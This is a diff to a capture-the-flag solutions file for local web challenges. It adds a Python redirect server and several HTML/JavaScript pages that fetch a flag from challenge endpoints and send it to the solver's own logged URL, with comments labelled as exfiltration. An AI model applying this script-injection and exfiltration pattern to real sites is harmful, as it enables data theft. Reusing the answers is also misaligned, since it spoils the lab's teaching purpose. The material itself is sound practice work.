@@ -159,8 +159,48 @@ nc -lnvp 1337
 ## 🟢 Speaking Redirects
 
 ```bash
-# Handled via crafted HTTP redirect responses using netcat listener
-nc -lnvp 1337
+#!/usr/bin/env python3
+from http.server import HTTPServer, BaseHTTPRequestHandler
+import sys
+
+class DebugRedirectHandler(BaseHTTPRequestHandler):
+    def do_GET(self):
+        print("\n" + "="*50)
+        print(f"Received GET request for: {self.path}")
+        print(f"Headers:")
+        for header, value in self.headers.items():
+            print(f"  {header}: {value}")
+        
+        # The target URL from /challenge/server's perspective
+        target = "http://challenge.localhost/verify"
+        print(f"\nRedirecting to: {target}")
+        
+        self.send_response(302)
+        self.send_header('Location', target)
+        self.send_header('Content-Type', 'text/html')
+        self.end_headers()
+        
+        # Optional: Send a small HTML body
+        self.wfile.write(b"<html><body>Redirecting...</body></html>")
+        
+    def do_HEAD(self):
+        # Handle HEAD requests the same way
+        self.do_GET()
+        
+    def log_message(self, format, *args):
+        # Enable logging with timestamp
+        print(f"[{self.log_date_time_string()}] {format % args}")
+
+if __name__ == '__main__':
+    port = 1337
+    server = HTTPServer(('0.0.0.0', port), DebugRedirectHandler)
+    print(f"Redirect server running on port {port}")
+    print(f"Press Ctrl+C to stop")
+    try:
+        server.serve_forever()
+    except KeyboardInterrupt:
+        print("\nServer stopped")
+        sys.exit(0)
 ```
 
 ---
@@ -168,8 +208,27 @@ nc -lnvp 1337
 ## 🟢 JavaScript Redirects
 
 ```bash
-# Accessed redirected endpoint manually after inspecting JS response
-curl http://challenge.localhost/<redirected-endpoint>
+# Create the public_html directory if it doesn't exist
+mkdir -p /home/hacker/public_html
+
+# Create the solve.html file with the redirect
+cat > /home/hacker/public_html/solve.html << 'EOF'
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Redirecting...</title>
+</head>
+<body>
+    <script>
+        window.location = "http://challenge.localhost/hack";
+    </script>
+    <p>Redirecting to flag...</p>
+</body>
+</html>
+EOF
+
+# Make sure it's readable
+chmod 644 /home/hacker/public_html/solve.html
 ```
 
 ---
@@ -177,16 +236,39 @@ curl http://challenge.localhost/<redirected-endpoint>
 ## 🟢 Including JavaScript
 
 ```bash
-curl http://challenge.localhost/<javascript-resource>
-```
+# Create the solve.html file
+cat > /home/hacker/public_html/solve.html << 'EOF'
+<script src="http://challenge.localhost/gateway"></script>
+<script>
+setTimeout(function() {
+    // Exfiltrate via redirect - appears in server logs
+    window.location = "http://challenge.localhost/~hacker/log?" + window.flag;
+}, 100);
+</script>
+EOF
+
+# Make sure it's readable
+chmod 644 /home/hacker/public_html/solve.html```
 
 ---
 
 ## 🟢 HTTP (javascript)
 
 ```bash
-# Triggered HTTP request via browser JavaScript execution
-# (Observed and replicated request manually with curl)
+# Create the solve.html file
+cat > /home/hacker/public_html/solve.html << 'EOF'
+<script>
+fetch("http://challenge.localhost/complete")
+    .then(response => response.text())
+    .then(flag => {
+        // Redirect to log the flag (will appear in server logs)
+        window.location = "http://challenge.localhost/~hacker/?" + encodeURIComponent(flag);
+    });
+</script>
+EOF
+
+# Make sure it's readable
+chmod 644 /home/hacker/public_html/solve.html
 ```
 
 ---
@@ -194,13 +276,42 @@ curl http://challenge.localhost/<javascript-resource>
 ## 🟢 HTTP GET Parameters (javascript)
 
 ```bash
-curl "http://challenge.localhost/<endpoint>?param=value"
-```
+# Create the solve.html file
+cat > /home/hacker/public_html/solve.html << 'EOF'
+<script>
+fetch("http://challenge.localhost/pwn?auth_pass=gjnnhpqe&token=fokrgfle&authcode=mckfmbwo")
+    .then(response => response.text())
+    .then(flag => {
+        // Exfiltrate the flag
+        window.location = "http://challenge.localhost/~hacker/?" + encodeURIComponent(flag);
+    });
+</script>
+EOF
+
+# Make sure it's readable
+chmod 644 /home/hacker/public_html/solve.html```
 
 ---
 
 ## 🟢 HTTP Forms (javascript)
 
 ```bash
-curl -X POST -d "key=value" http://challenge.localhost/<endpoint>
-```
+# Create the solve.html file
+cat > /home/hacker/public_html/solve.html << 'EOF'
+<script>
+fetch("http://challenge.localhost/qualify", {
+    method: 'POST',
+    headers: {
+        'Content-Type': 'application/x-www-form-urlencoded',
+    },
+    body: 'secure_key=hjjdciil&unlock_code=aytpcgqm&hash=zaomqlkp'
+})
+.then(response => response.text())
+.then(flag => {
+    window.location = "http://challenge.localhost/~hacker/?" + encodeURIComponent(flag);
+});
+</script>
+EOF
+
+# Make sure it's readable
+chmod 644 /home/hacker/public_html/solve.html```
